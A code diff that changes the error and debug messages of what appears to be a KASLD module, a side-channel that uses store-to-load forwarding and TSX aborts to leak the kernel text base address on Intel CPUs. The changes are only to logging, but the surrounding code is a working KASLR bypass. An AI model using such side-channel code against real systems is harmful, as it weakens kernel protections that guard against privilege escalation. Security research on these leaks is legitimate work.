@@ -178,24 +178,23 @@ int main(void) {
   debug_mode = kasld_env_enabled("KASLD_DATABOUNCE_DEBUG");
   kasld_info("trying the databounce store-to-load forwarding side-channel ...");
   if (!is_intel_cpu()) {
-    fprintf(stderr,
-            "[-] databounce: not an Intel CPU; attack not applicable\n");
+    kasld_err("databounce: not an Intel CPU; attack not applicable");
     return kasld_disp_absent("not an Intel CPU");
   }
 
   if (!has_rtm()) {
-    fprintf(stderr, "[-] databounce: TSX/RTM not available; "
-                    "required for store-to-load forwarding\n");
+    kasld_err("databounce: TSX/RTM not available; "
+              "required for store-to-load forwarding");
     return kasld_disp_absent("TSX/RTM not available");
   }
 
-  fprintf(stderr, "[.] databounce: using TSX abort mode\n");
+  kasld_info("databounce: using TSX abort mode");
 
   memset(probe, 1, sizeof(probe));
 
   cache_miss_threshold = detect_flush_reload_threshold();
-  fprintf(stderr, "[.] databounce: cache miss threshold: %zu cycles\n",
-          cache_miss_threshold);
+  kasld_info("databounce: cache miss threshold: %zu cycles",
+             cache_miss_threshold);
 
   /* Pin to a single core to reduce noise */
   pin_cpu(1);
@@ -213,12 +212,12 @@ int main(void) {
    * thing worth seeing on unfamiliar hardware -- whether the sweeps agreed, or
    * whether one value scraped a majority over a spread of disagreeing ones. */
   if (debug_mode) {
-    fprintf(stderr, "# databounce: %d sweeps\n", DATABOUNCE_SWEEPS);
+    kasld_info("# databounce: %d sweeps", DATABOUNCE_SWEEPS);
     for (int s = 0; s < DATABOUNCE_SWEEPS; s++) {
       if (samples[s])
-        fprintf(stderr, "#   sweep %d: 0x%lx\n", s, samples[s]);
+        kasld_info("#   sweep %d: 0x%lx", s, samples[s]);
       else
-        fprintf(stderr, "#   sweep %d: no hit\n", s);
+        kasld_info("#   sweep %d: no hit", s);
     }
   }
 
@@ -239,8 +238,8 @@ int main(void) {
   }
 
   if (!addr || best_count < DATABOUNCE_SWEEPS / 4) {
-    fprintf(stderr, "[-] databounce: no kernel mapping detected "
-                    "(CPU may not be vulnerable)\n");
+    kasld_err("databounce: no kernel mapping detected "
+              "(CPU may not be vulnerable)");
     return kasld_disp_inconclusive(
         "no kernel mapping (CPU may not be vulnerable)");
   }
@@ -250,7 +249,7 @@ int main(void) {
   bool pti = detect_kpti();
   const char *symbol = pti ? "__entry_text_start" : "_stext";
 
-  fprintf(stderr, "[+] databounce: %s = 0x%016lx\n", symbol, addr);
+  kasld_found("databounce: %s = 0x%016lx", symbol, addr);
   kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr, symbol,
                       CONF_TIMING);
 
